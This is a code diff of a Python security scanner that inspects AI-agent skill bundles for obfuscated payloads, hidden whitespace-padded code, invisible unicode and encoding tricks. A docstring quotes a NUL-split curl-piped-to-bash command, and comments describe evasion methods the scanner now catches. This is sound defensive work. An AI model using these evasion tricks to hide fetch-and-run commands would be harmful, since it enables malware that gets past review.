+def _mask_prose_link_destinations(lines: list[str]) -> list[str]:
     """Mask link destinations only in Markdown prose. Inside a fenced or indented code block a
     ``[x](../..)`` is an argument to whatever command surrounds it, not a hyperlink, so those lines
     scan verbatim. Fence state is ``(marker_char, opener_length)`` rather than a bool so a
     mismatched fence line cannot drop the scanner back into prose mode; an unclosed fence stays
     code to EOF (fail-safe)."""
-    out: List[str] = []
+    out: list[str] = []
     fence = None  # (marker char, opener length) while a fenced block is open
     for line in lines:
         match = _FENCE_LINE.match(_CONTAINER_PREFIX.sub("", line))
@@ -592,54 +734,190 @@ def _mask_prose_link_destinations(lines: List[str]) -> List[str]:
     return out
 
 
-def scan_file(file_path: Path, rel_path: str = "") -> List[Finding]:
-    """Threat-pattern + invisible-unicode scan of one file; *rel_path* is the display path (default: file
-    name). Regex findings dedupe per pattern per line; invisible chars yield one per line."""
-    rel_path = rel_path or file_path.name
-    if file_path.suffix.lower() not in SCANNABLE_EXTENSIONS and file_path.name != "SKILL.md":
-        return []
+# Only python_os_environ was tuned for docstring prose; every other pattern must still fire inside a
+# triple-quoted string, since wrapping a payload in one is an evasion, not a false positive.
+_DOCSTRING_EXEMPT_PATTERN_IDS = frozenset({"python_os_environ"})
+_SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3}
+
+
+def _line_at(prefix: str) -> int:
+    """1-indexed line a finding at the end of *prefix* sits on, breaking on CRLF, LF and lone CR as _scan_text does."""
+    return prefix.replace('\r\n', '\n').replace('\r', '\n').count('\n') + 1
+
+
+def _decoded_views(raw: bytes, rel_path: str, suffix: str) -> tuple[list[str], list[Finding]]:
+    """Every text the file can execute as, plus findings for the decoding tricks seen. The scanner must
+    read what the interpreter runs: a ``.py`` PEP 263 cookie (e.g. utf-7) re-decodes an ASCII-clean file,
+    and bash drops NUL bytes, so ``c\\0url ... | ba\\0sh`` runs while beating every regex."""
     try:
-        lines = file_path.read_text(encoding='utf-8-sig').split('\n')
-    except (UnicodeDecodeError, OSError):
-        return []
-    findings = []
+        texts, findings = [raw.decode('utf-8-sig')], []
+    except UnicodeDecodeError as exc:
+        # Malformed input raises suspicion instead of silencing the scan: decode with replacement so every
+        # pattern pass still runs, and flag the file (one bad byte used to exempt it entirely).
+        texts = [raw.decode('utf-8-sig', errors='replace')]
+        bad_line = _line_at(exc.object[:exc.start].decode('latin-1'))  # offsets index the BOM-stripped bytes
+        findings = [Finding("invalid_utf8", "high", "injection", rel_path, bad_line, "non-UTF-8 bytes",
+                            "invalid UTF-8 decoded with replacement (possible encoding-obfuscated payload)")]
+    if suffix == ".py":
+        # An unusable cookie (incl. 'undefined', whose codec raises UnicodeError) makes CPython refuse the file.
+        with suppress(SyntaxError, LookupError, UnicodeError):
+            # CPython also breaks lines on a lone CR; detect_encoding splits on LF only.
+            lf_raw = raw.replace(b'\r\n', b'\n').replace(b'\r', b'\n')
+            codec = tokenize.detect_encoding(io.BytesIO(lf_raw).readline)[0]
+            if codecs.lookup(codec).name not in ("utf-8", "utf-8-sig"):  # detect_encoding leaves 'utf8' as is
+                try:
+                    alt = raw.decode(codec, errors='replace')
+                except UnicodeError:  # e.g. idna refuses 'replace' yet CPython runs it; flag it on a latin-1 view
+                    alt = None
+                # ascii/latin-1 over ASCII-only bytes runs exactly the text already scanned: nothing is hidden.
+                if alt != texts[0]:
+                    texts.append(raw.decode('latin-1') if alt is None else alt)
+                    findings.append(Finding("non_utf8_source_encoding", "high", "obfuscation", rel_path, 1,
+                                            f"coding: {codec}", f"Python source declares the {codec} encoding "
+                                            "(possible encoding-obfuscated payload)"))
+    if '\x00' in texts[0]:
+        texts.append(texts[0].replace('\x00', ''))
+        findings.append(Finding("nul_byte", "high", "obfuscation", rel_path, _line_at(texts[0][:texts[0].index('\x00')]),
+                                "NUL byte", "NUL byte in a text file (possible pattern-splitting obfuscation)"))
+    return texts, findings
+
+
+def _scan_text(text: str, rel_path: str, suffix: str, skill: bool) -> list[Finding]:
+    lines = text.replace('\r\n', '\n').replace('\r', '\n').split('\n')  # read_bytes skips newline translation
+    findings: list[Finding] = []
     docstring_lines = _compute_docstring_lines(lines)  # so code patterns don't fire on prose
-    traversal_lines = _mask_prose_link_destinations(lines) if file_path.suffix.lower() == ".md" else lines
-    suffix, owners = file_path.suffix.lower(), _statement_owners(lines)  # per-file context for the demotion
-    for pattern, pid, severity, category, description in _COMPILED_THREAT_PATTERNS:
+    traversal_lines = _mask_prose_link_destinations(lines) if suffix == ".md" else lines
+    owners = _statement_owners(lines)  # per-file context for the demotion
+    patterns = _COMPILED_THREAT_PATTERNS + (SKILL_ONLY_PATTERNS if skill else [])
+    views = code_views(lines) if suffix == ".py" and (skill or docstring_lines) else None
+    for pattern, pid, severity, category, description in patterns:
         for i, line in enumerate(lines, start=1):
-            scan_line = traversal_lines[i - 1] if pid in _PATH_TRAVERSAL_PATTERN_IDS else line
-            if i not in docstring_lines and pattern.search(scan_line):
+            if pid in _DOCSTRING_EXEMPT_PATTERN_IDS and i in docstring_lines:
+                if suffix != ".py":
+                    continue
+                # A triple-quoted token exempts its own columns, not executable code on the same line.
+                # Fall back to raw text on a lexer failure (fail closed).
+                scan_line = ("".join(" " if masked else char for char, masked in zip(line, views[1][i - 1]))
+                             if views else line)
+            else:
+                scan_line = (traversal_lines[i - 1] if pid in _PATH_TRAVERSAL_PATTERN_IDS
+                             else views[0][i - 1] if views and pid == "hermes_env_dotenv" else line)
+            if pattern.search(scan_line):
                 text = line.strip()
                 line_severity, line_description = _demote_inert_path_reference(
                     pid, severity, description, line, lines[owners[i - 1]], suffix)
                 findings.append(Finding(pid, line_severity, category, rel_path, i,
                                         text if len(text) <= 120 else text[:117] + "...", line_description))
+    if skill:
+        raise_provider_key_reads(findings, lines, views[1] if views else None)
     for i, line in enumerate(lines, start=1):
         if (char := next((c for c in INVISIBLE_CHARS if c in line), None)) is not None:
             name = _unicode_char_name(char)
             findings.append(Finding("invisible_unicode", "high", "injection", rel_path, i,
                                     f"U+{ord(char):04X} ({name})",
                                     f"invisible unicode character {name} (possible text hiding/injection)"))
+    if suffix not in _PADDED_CODE_EXEMPT_SUFFIXES:
+        findings.extend(_padded_code_findings(lines, rel_path))
     return findings
 
 
+# Code pushed off-screen: a run of 200+ spaces/tabs, then 40+ characters on the same line. An editor or
+# GitHub's diff shows the line ending at the padding, so a loader appended there (a known campaign
+# infecting developers' machines and appending to their `vite.config.js` / `init`) is invisible to a
+# reviewer. Prose formats (Markdown tables pad cells) are exempt; across every catalog pin no other code
+# file has such a line.
+_PADDED_CODE = re.compile(r"(?<![ \t])[ \t]{200,}+(?=\S[^\n]{39})")
+_PADDED_CODE_EXEMPT_SUFFIXES = {".md", ".txt", ".html", ".xml", ".tex", ".css"}
+# The hidden tail must hold a word; a saved traceback's `~~~^^^` underline after its indent is not code.
+_CODE_WORD = re.compile(r"[A-Za-z_$][\w$]{2,}")
+
+
+def _padded_code_findings(lines: list[str], rel_path: str) -> list[Finding]:
+    out = []
+    for i, line in enumerate(lines, start=1):
+        if (m := _PADDED_CODE.search(line)) is not None and _CODE_WORD.search(hidden := line[m.end():]):
+            out.append(Finding("hidden_padded_code", "critical", "obfuscation", rel_path, i,
+                               f"{m.end() - m.start()} blank chars then: {hidden[:80]}",
+                               "code hidden after a long run of whitespace (off-screen in editors and diffs)"))
+    return out
+
+
+def _unscanned_text_padded_code(file_path: Path, rel_path: str) -> list[Finding]:
+    """Files outside SCANNABLE_EXTENSIONS (extensionless ``init``, ``.mjs``/``.cjs``/``.tsx``) get only the
+    padded-code check: the other rules were never tuned for them, so turning those on would move verdicts."""
+    if file_path.suffix.lower() in _PADDED_CODE_EXEMPT_SUFFIXES or file_path.stat().st_size > 2_000_000:
+        return []
+    try:
+        data = file_path.read_bytes()
+        if b"\0" in data[:8192]:
+            return []  # binary
+        return _padded_code_findings(data.decode("utf-8-sig", errors="replace").split("\n"), rel_path)
+    except OSError:
+        return []
+
+
+def scan_file(file_path: Path, rel_path: str = "", *, skill: bool = False) -> list[Finding]:
+    """Threat-pattern + invisible-unicode scan of one file; *rel_path* is the display path (default: file
+    name). Regex findings dedupe per pattern per line; invisible chars yield one per line. *skill* adds the
+    skill-only credential rules (``tools.skills_guard_credentials``)."""
+    rel_path = rel_path or file_path.name
+    if file_path.suffix.lower() not in SCANNABLE_EXTENSIONS and file_path.name != "SKILL.md":
+        return _unscanned_text_padded_code(file_path, rel_path)
+    try:
+        raw = file_path.read_bytes()
+    except OSError:
+        return []
+    suffix = file_path.suffix.lower()
+    texts, findings = _decoded_views(raw, rel_path, suffix)
+    merged = _scan_text(texts[0], rel_path, suffix, skill)
+    at: dict = {}
+    for n, f in enumerate(merged):
+        at.setdefault((f.pattern_id, f.line), n)
+    # The extra views add hits the primary decode missed, and upgrade one another view scored higher:
+    # NUL-stripping can restore the token that lifts a finding to critical.
+    for f in (f for text in texts[1:] for f in _scan_text(text, rel_path, suffix, skill)):
+        key = (f.pattern_id, f.line)
+        if key not in at:
+            at[key] = len(merged)
+            merged.append(f)
+        elif _SEVERITY_ORDER.get(f.severity, 4) < _SEVERITY_ORDER.get(merged[at[key]].severity, 4):
+            merged[at[key]] = f
+    return findings + merged
+
+
+# Findings that only inform on a COMMUNITY skill install, where the matched text cannot act:
+# ``sudo_usage`` / ``bind_all_interfaces`` in Markdown — setup docs (`sudo apt install`,
+# `runserver 0.0.0.0:8000` in a Dockerfile CMD) are not executed by installing; running them goes
+# through the terminal tool and its approval gate. Scripts keep the full severity.
+# ``inline_shell_exec`` stays high: the runtime's community gate keys on the hub lock entry's own
+# directory, so a nested SKILL.md, an external_dirs view or an unreadable lock still expands it.
+_DOC_NOTE_IDS = frozenset({"sudo_usage", "bind_all_interfaces"})
+
+
+def _community_note(f: Finding) -> Finding:
+    if f.severity in ("critical", "high") and (
+            f.pattern_id in _DOC_NOTE_IDS and f.file.lower().endswith(".md")):
+        f.severity, f.description = "medium", f"{f.description} (not executed on install; informational)"
+    return f
+
+
 def scan_skill(skill_path: Path, source: str = "community") -> ScanResult:
-    """Structural checks + pattern scan of every text file in a skill dir (or a single file). A gitignore-style
-    `.skillignore` / `.clawhubignore` excludes dev/docs artifacts from BOTH passes; the ignore file itself is
-    always excluded and `SKILL.md` can never be un-ignored. *source* (e.g. "openai/skills") sets the trust level."""
+    """Structural checks + pattern scan of every file in a skill dir (or a single file). Bundle-supplied ignore
+    files (`.skillignore` / `.clawhubignore`) are NOT honored: they are authored by the publisher being scanned,
+    so a `*` would mask every payload. *source* (e.g. "openai/skills") sets the trust level."""
     name, trust = skill_path.name, _resolve_trust_level(source)
-    findings: List[Finding] = []
+    findings: list[Finding] = []
     if skill_path.is_dir():
-        ignore = _load_skill_ignore(skill_path)
-        findings.extend(_check_structure(skill_path, ignore=ignore))
+        findings.extend(_check_structure(skill_path))
         for f in skill_path.rglob("*"):
-            if f.is_file() and not ignore(rel := str(f.relative_to(skill_path))):
-                findings.extend(scan_file(f, rel))
+            if f.is_file():
+                findings.extend(scan_file(f, str(f.relative_to(skill_path)), skill=True))
     elif skill_path.is_file():
-        findings.extend(scan_file(skill_path, skill_path.name))
+        findings.extend(scan_file(skill_path, skill_path.name, skill=True))
+    if trust == "community":
+        findings = [_community_note(f) for f in findings]
     verdict = _determine_verdict(findings)
-    return ScanResult(name, source, trust, verdict, findings, datetime.now(timezone.utc).isoformat(),
+    return ScanResult(name, source, trust, verdict, findings, datetime.now(UTC).isoformat(),
                       _build_summary(name, source, trust, verdict, findings))
 
 
@@ -668,15 +946,15 @@ def content_hash(skill_path: Path) -> str:
 
 
 def scan_skill_cached(skill_path: Path, source: str = "community", *, source_url: str = "",
-                      cache_dir: Path | None = None) -> Tuple[ScanResult, dict]:
+                      cache_dir: Path | None = None) -> tuple[ScanResult, dict]:
     """Scan plus attestation dict; the cache (keyed by content digest + source identity) only serves exact
     current content under the current scanner version."""
     digest = _content_digest(skill_path)
     cache_root = cache_dir or skill_path.parent / ".scan-cache"
-    source_identity = hashlib.sha256(f"{source}\0{source_url}".encode("utf-8")).hexdigest()[:16]
+    source_identity = hashlib.sha256(f"{source}\0{source_url}".encode()).hexdigest()[:16]
     cache_file = cache_root / f"{digest}-{source_identity}.json"
     expected = {"bundle_hash": f"sha256:{digest}", "scanner_version": SCANNER_VERSION, "source": source,
-                "source_url": source_url}
+                "source_url": source_url, "trust_level": _resolve_trust_level(source)}
     cached = None
     with suppress(OSError, json.JSONDecodeError):
         cached = json.loads(cache_file.read_text(encoding="utf-8-sig"))
@@ -698,7 +976,7 @@ def scan_skill_cached(skill_path: Path, source: str = "community", *, source_url
     return result, provenance
 
 
-def should_allow_install(result: ScanResult, force: bool = False) -> Tuple[bool, str]:
+def should_allow_install(result: ScanResult, force: bool = False) -> tuple[bool, str]:
     """``(allowed, reason)`` from verdict + trust; *force* overrides every block except a dangerous verdict on
     community/trusted sources. ``allowed`` is None when policy says "ask"."""
     decision = INSTALL_POLICY.get(result.trust_level, INSTALL_POLICY["community"])[VERDICT_INDEX.get(result.verdict, 2)]
@@ -718,8 +996,7 @@ def format_scan_report(result: ScanResult) -> str:
     """Compact multi-line report for CLI/chat display; findings sorted critical → low."""
     lines = [f"Scan: {result.skill_name} ({result.source}/{result.trust_level})  Verdict: {result.verdict.upper()}"]
     if result.findings:
-        order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
-        for f in sorted(result.findings, key=lambda f: order.get(f.severity, 4)):
+        for f in sorted(result.findings, key=lambda f: _SEVERITY_ORDER.get(f.severity, 4)):
             lines.append(f"  {f.severity.upper().ljust(8)} {f.category.ljust(14)} "
                          f"{f'{f.file}:{f.line}'.ljust(30)} \"{f.match[:60]}\"")
         lines.append("")
@@ -728,9 +1005,8 @@ def format_scan_report(result: ScanResult) -> str:
     return "\n".join(lines + [f"Decision: {status} — {reason}"])
 
 
-def _check_structure(skill_dir: Path, ignore=None) -> List[Finding]:
-    """Structural anomalies (counts, sizes, binaries, stray executables, escaping symlinks); *ignore(rel) -> bool*
-    excludes paths from every count and finding."""
+def _check_structure(skill_dir: Path) -> list[Finding]:
+    """Structural anomalies (counts, sizes, binaries, stray executables, escaping symlinks)."""
     findings = []
 
     def add(pid, sev, cat, rel, match, desc):
@@ -738,7 +1014,7 @@ def _check_structure(skill_dir: Path, ignore=None) -> List[Finding]:
     file_count = total_size = 0
     for f in skill_dir.rglob("*"):
         rel = str(f.relative_to(skill_dir))
-        if not (f.is_file() or f.is_symlink()) or (ignore is not None and ignore(rel)):
+        if not (f.is_file() or f.is_symlink()):
             continue
         file_count += 1
         if f.is_symlink():
@@ -773,48 +1049,6 @@ def _check_structure(skill_dir: Path, ignore=None) -> List[Finding]:
     return findings
 
 
-# `.skillignore` is Hermes-native; `.clawhubignore` is honored for skills published through ClawHub.
-_SKILL_IGNORE_FILENAMES = (".skillignore", ".clawhubignore")
-
-
-def _load_skill_ignore(skill_dir: Path):
-    """Build ``ignore(rel_posix_path) -> bool`` from `.skillignore` / `.clawhubignore`. gitignore basics: blank
-    lines and ``#`` comments skipped; trailing ``/`` = directory (it and everything under it); ``*``/``?`` globs via
-    fnmatch on the full path and each segment; leading ``/`` anchors to the root. Ignore files always excluded;
-    ``SKILL.md`` never."""
-    patterns: List[str] = []
-    for ig in (skill_dir / name for name in _SKILL_IGNORE_FILENAMES):
-        with suppress(UnicodeDecodeError, OSError):
-            if ig.is_file():
-                patterns.extend(s for s in map(str.strip, ig.read_text(encoding="utf-8-sig").splitlines())
-                                if s and not s.startswith("#"))
-
-    def ignore(rel: str) -> bool:
-        rel_posix = Path(rel).as_posix()
-        segs = rel_posix.split("/")
-        base = segs[-1]
-        if base == "SKILL.md":
-            return False
-        if base in _SKILL_IGNORE_FILENAMES:
-            return True
-        for pat in patterns:
-            anchored = pat.startswith("/")
-            p = pat.strip("/")
-            if not p:
-                continue
-            below = rel_posix.startswith(p + "/")
-            if pat.endswith("/"):  # the dir itself or anything under it; unanchored also as an inner path component
-                if rel_posix == p or below or (not anchored and ("/" + p + "/") in ("/" + rel_posix + "/")):
-                    return True
-            # Unanchored: also the basename, any path segment, or a prefix dir (`docs` ignores docs/plans/x.md).
-            elif fnmatch.fnmatch(rel_posix, p) or (not anchored and (fnmatch.fnmatch(base, p) or below or (
-                    "/" not in p and any(fnmatch.fnmatch(seg, p) for seg in segs)))):
-                return True
-        return False
-
-    return ignore
-
-
 _SOURCE_PREFIX_ALIASES = ("skills-sh/", "skills.sh/", "skils-sh/", "skils.sh/")
 
 
@@ -829,24 +1063,13 @@ def _resolve_trust_level(source: str) -> str:
     return "trusted" if any(src == t or src.startswith(f"{t}/") for t in TRUSTED_REPOS) else "community"
 
 
-def _determine_verdict(findings: List[Finding]) -> str:
+def _determine_verdict(findings: list[Finding]) -> str:
     """critical → dangerous, high → caution; medium/low alone are informational (safe)."""
     sev = {f.severity for f in findings}
     return "dangerous" if "critical" in sev else "caution" if "high" in sev else "safe"
 
 
-def _build_summary(name: str, source: str, trust: str, verdict: str, findings: List[Finding]) -> str:
+def _build_summary(name: str, source: str, trust: str, verdict: str, findings: list[Finding]) -> str:
     if not findings:
         return f"{name}: clean scan, no threats detected"
     return f"{name}: {verdict} — {len(findings)} finding(s) in {', '.join(sorted({f.category for f in findings}))}"
-
-
-# ---- BEGIN PLUGIN-COMPAT (revert-scheduled; see COMPAT_MANIFEST.md) ----
-# Names external plugins imported from this module before the Sep 2026 decomposition.
-# Internal code MUST NOT use these (scripts/check_compat_pointers.py fails CI if it does).
-# The whole block is removed by reverting the commit that added it.
-
-def full_content_hash(skill_path: Path) -> str:
-    """Full canonical digest used to bind scanner attestations."""
-    return f"sha256:{_content_digest(skill_path)}"
-# ---- END PLUGIN-COMPAT ----
